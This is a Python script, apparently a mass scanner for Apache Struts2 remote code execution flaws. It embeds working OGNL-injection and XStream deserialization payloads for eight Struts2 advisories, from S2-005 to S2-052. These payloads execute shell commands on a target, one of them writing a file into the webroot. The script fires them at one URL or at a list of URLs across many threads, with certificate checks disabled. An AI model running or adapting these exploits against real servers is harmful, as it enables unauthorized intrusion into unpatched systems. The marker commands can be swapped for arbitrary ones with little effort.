#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
#Author: Evan's 
#Editor： JrD

import requests
import threadpool
import getopt
import sys

s2_052_poc = r'''<map>  
<entry>  
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>touch</string><string>../webapps/ROOT/helloword.txt</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>  
</entry>  
</map>'''
s2_048_poc = {'name':r'''${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo HelloWord!').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''','age':'123','__checkbox_bustedBefore':'123'}
s2_045_poc = r'''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('Hello')).(#res.getWriter().print('Word!')).(#res.getWriter().flush()).(#res.getWriter().close())}'''
s2_037_poc = r'''(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close()):xx.toString.json?&pp=%2f&encoding=UTF-8&web=Hello&path=Word!'''
s2_032_poc = r'''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=Hello&path=Word!'''
s2_019_poc = r'''debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22Hello%22),%23resp.getWriter().print(%22Word!%22),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
s2_016_poc = r'''redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22Hello%22),%23resp.getWriter().print(%22Word!%22),%23resp.getWriter().flush(),%23resp.getWriter().close()}'''
s2_005_poc = r'''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))=&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))=&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\43xman.getWriter().print("webpath")')(d))=&&(i96)(('\43xman.getWriter().print("HelloWord!")')(d))=&(i99)(('\43xman.getWriter().close()')(d))='''
user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'

example = """
Example:
   	python struts2_scan.py -u https://example.com
   	python struts2_scan.py -f url.txt -t 50
   	"""

def s2(urls):
	requests.packages.urllib3.disable_warnings()
#052
	try:
		url = urls + '/struts2-rest-showcase/orders.xhtml'
		post = requests.get(url=url,data=s2_052_poc,headers={'User-Agent':user_agent,'Content-type':'application/xml'},verify=False,timeout=3)
		if 'java.util.HashMap' in post.text and post.status_code == 500:
			print (urls + ' ---- ' + 'struts-052!!')
	except:
		pass
	try:
		post = requests.get(url=urls,data=s2_052_poc,headers={'User-Agent':user_agent,'Content-type':'application/xml'},verify=False,timeout=3)
		if 'java.util.HashMap' in post.text and post.status_code == 500:
			print (urls + ' ---- ' + 'struts-052!!')
	except:
		pass
#048
	try:
		url_ = urls + '/struts2-showcase/integration/editGangster.action'
		post = requests.post(url=url_,data=s2_048_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in post.text:
			print (url_ + ' ---- ' + 'struts-048!!')
	except:
		pass
	try:
		post = requests.post(url=urls,data=s2_048_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in post.text:
			print (urls + ' ---- ' + 'struts-048!!')
	except:
		pass
#045
	try:
		get = requests.get(url=urls,headers={'User-Agent':user_agent,'Content-type':s2_045_poc},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts-045!!')
		else:
			post = requests.post(url=urls,data="username=admin&password=123456",headers={'User-Agent':user_agent,'Content-type':s2_045_poc},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts-045!!')
	except:
		pass
#037
	try:
		get = requests.get(url=urls+str('?')+s2_037_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts2-037!!')
		else:
			post = requests.post(url=urls,data=s2_037_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts2-037!!')
	except:
		pass
#032
	try:
		get = requests.get(url=urls+str('?')+s2_032_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts2-032!!')
		else:
			post = requests.post(url=urls,data=s2_032_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts2-032!!')
	except:
		pass
#019
	try:
		get = requests.get(url=urls+str('?')+s2_019_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts2-019!!')
		else:
			post = requests.post(url=urls,data=s2_019_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts2-019!!')
	except:
		pass
#016
	try:
		get = requests.get(url=urls+str('?')+s2_016_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts2-016!!')
		else:
			post = requests.post(url=urls,data=s2_016_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts2-016!!')
	except:
		pass
#005
	try:
		get = requests.get(url=urls+str('?')+s2_005_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
		if 'HelloWord!' in get.text:
			print (urls + ' ---- ' + 'struts2-005!!')
		else:
			post = requests.post(url=urls,data=s2_005_poc,headers={'User-Agent':user_agent},verify=False,timeout=3)
			if 'HelloWord!' in post.text:
				print (urls + ' ---- ' + 'struts2-005!!')
	except:
		pass

if __name__ == '__main__':
	argv = sys.argv[1:]
	if len(argv) == 0:
		print (example)
		sys.exit()
	try:
		options,args = getopt.getopt(argv,'u:f:t:',['url=','file=','thread='])
	except:
		print (example)
		sys.exit()
	urls = []
	thread = 30
	for option,value in options:
		if option in ('-u','--url'):
			urls.append(value)
		if option in ('-f','--file'):
			f = open(value)
			for u in f.readlines():
				urls.append(u.strip())
		if option in ('-t','--thread'):
			thread = int(value)
	try:
		pool = threadpool.ThreadPool(thread)
		req = threadpool.makeRequests(s2,urls)
		[ pool.putRequest(reqs) for reqs in req ]
		pool.wait()
	except:
		print ('exit.')
		sys.exit()